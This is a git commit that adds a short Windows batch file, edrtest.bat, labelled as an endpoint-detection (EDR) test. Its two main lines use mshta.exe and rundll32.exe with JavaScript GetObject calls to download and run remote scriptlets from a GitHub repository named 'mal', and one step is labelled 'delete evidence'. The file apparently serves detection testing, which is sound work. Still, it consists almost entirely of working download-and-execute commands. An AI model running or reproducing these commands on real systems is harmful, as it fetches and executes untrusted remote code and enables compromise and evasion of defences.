e5ae455287b6af77e9e76b5513ac7393dfd471e7
sgmr-gr <82320872+sgmr-gr@users.noreply.github.com>
2023-06-25 05:17:59 +0000

    Add files via upload

---
+++ edrtest.bat
@@ -0,0 +1,5 @@
+echo EDR test powershell activity
+mshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/sgmr-gr/mal/edrtest2.sct")).Exec();close()
+timeout 5
+echo EDR test delete evidence
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/sgmr-gr/mal/edrtest3")
